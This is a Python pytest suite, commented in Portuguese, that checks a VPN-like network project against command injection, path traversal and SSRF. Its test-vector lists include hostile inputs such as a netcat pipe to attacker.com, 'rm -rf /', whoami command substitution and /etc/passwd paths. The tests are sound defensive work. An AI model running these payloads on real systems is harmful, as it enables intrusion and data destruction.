"""Testes de segurança: Injeção de comandos em todos os subprocessos do projeto.

Estes testes verificam que nenhuma entrada de usuário ou dado externo
pode ser usada para injetar comandos arbitrários em chamadas subprocess.
Complementa test_security.py com foco explícito nos vetores de subprocess.
"""

import sys
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

from mogged.network.dns_manager import DNSManager
from mogged.network.kill_switch import KillSwitch
from mogged.network.server_validator import is_valid_public_ip


# ---------------------------------------------------------------------------
# Vetores de injeção de comandos — IPs maliciosos
# ---------------------------------------------------------------------------

INJECTION_VECTORS = [
    "8.8.8.8; calc.exe",
    "1.1.1.1 && whoami",
    "| nc attacker.com 4444",
    "$(whoami)",
    "`whoami`",
    "127.0.0.1\x00malicious",
    "http://169.254.169.254/",
    "\\x00\\x00",
    "../../../etc/passwd",
    "' OR '1'='1",
    "8.8.8.8\nrm -rf /",
    "8.8.8.8\r\nContent-Type: text/html",
    "%0d%0aSET",
    "<script>alert(1)</script>",
    "localhost",
    "0177.0.0.1",         # octal — técnica de bypass SSRF
    "0x7f000001",         # hexadecimal — técnica de bypass SSRF
    "2130706433",         # decimal — técnica de bypass SSRF (127.0.0.1)
    "::1",                # IPv6 loopback
    "::ffff:127.0.0.1",   # IPv4-mapped IPv6 loopback
]


@pytest.mark.parametrize("vector", INJECTION_VECTORS)
def test_ip_validator_rejects_all_injection_vectors(vector: str) -> None:
    """is_valid_public_ip deve rejeitar todos os vetores de injeção sem exceção."""
    result = is_valid_public_ip(vector)
    assert result is False, f"Vetor de injeção não rejeitado: {repr(vector)}"


# ---------------------------------------------------------------------------
# Verificação de shell=True ausente em módulos críticos
# ---------------------------------------------------------------------------


@pytest.mark.skipif(sys.platform != "win32", reason="ipconfig é Windows-only")
def test_dns_flush_subprocess_no_shell_true() -> None:
    """DNSManager.flush_dns não deve usar shell=True em nenhuma circunstância."""
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0)
        DNSManager.flush_dns()

    for call in mock_run.call_args_list:
        assert call.kwargs.get("shell") is not True, (
            "CRÍTICO: subprocess.run chamado com shell=True em dns_manager"
        )


@pytest.mark.skipif(sys.platform != "win32", reason="netsh é Windows-only")
def test_kill_switch_subprocess_no_shell_true(tmp_path: Path) -> None:
    """KillSwitch.enable() / cleanup() não deve usar shell=True."""
    fake_exe = tmp_path / "Discord.exe"
    fake_exe.write_bytes(b"MZ")

    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0)
        ks = KillSwitch(str(fake_exe))
        ks.enable()
        ks.disable()

    for call in mock_run.call_args_list:
        assert call.kwargs.get("shell") is not True, (
            "CRÍTICO: subprocess.run chamado com shell=True em kill_switch"
        )


# ---------------------------------------------------------------------------
# Path traversal em entradas do ServerFetcher
# ---------------------------------------------------------------------------


PATH_TRAVERSAL_INPUTS = [
    "../../../etc/passwd",
    "..\\..\\windows\\system32\\cmd.exe",
    "/etc/passwd",
    "C:\\Windows\\System32\\calc.exe",
    "file:///etc/passwd",
    "\\\\attacker\\share\\malware.exe",
]


@pytest.mark.parametrize("payload", PATH_TRAVERSAL_INPUTS)
def test_ip_validator_rejects_path_traversal(payload: str) -> None:
    """Entradas com path traversal devem ser rejeitadas pelo validador de IP."""
    assert is_valid_public_ip(payload) is False


# ---------------------------------------------------------------------------
# Verificar que os valores de RULE_NAME do KillSwitch não contêm metacaracteres
# ---------------------------------------------------------------------------


def test_kill_switch_rule_name_is_safe() -> None:
    """RULE_NAME não deve conter metacaracteres de shell que poderiam ser explorados."""
    from mogged.network.kill_switch import RULE_NAME

    dangerous_chars = ["&", "|", ";", ">", "<", "`", "$", "(", ")", "{", "}", "\\", "\n", "\r"]
    for ch in dangerous_chars:
        assert ch not in RULE_NAME, f"Caractere perigoso '{ch}' encontrado em RULE_NAME"


# ---------------------------------------------------------------------------
# Verificar que diretivas DNS não contêm injeção
# ---------------------------------------------------------------------------


def test_dns_directives_are_safe_strings() -> None:
    """As diretivas geradas pelo DNSManager não devem conter caracteres de shell."""
    directives = DNSManager.get_openvpn_dns_directives()
    dangerous = [";", "&", "|", "`", "$", "(", ")", "<", ">"]
    for directive in directives:
        for ch in dangerous:
            assert ch not in directive, (
                f"Diretiva DNS contém caractere perigoso '{ch}': {directive!r}"
            )


# ---------------------------------------------------------------------------
# SSRF: URLs de metadados de cloud não podem ser alvos
# ---------------------------------------------------------------------------

CLOUD_METADATA_IPS = [
    "169.254.169.254",   # AWS, GCP, Azure IMDS
    "100.100.100.200",   # Alibaba Cloud Metadata
    "192.0.0.192",       # reservado IANA
]


@pytest.mark.parametrize("ip", CLOUD_METADATA_IPS)
def test_cloud_metadata_ips_are_rejected(ip: str) -> None:
    """IPs de serviços de metadados de cloud devem ser rejeitados pelo validador."""
    assert is_valid_public_ip(ip) is False
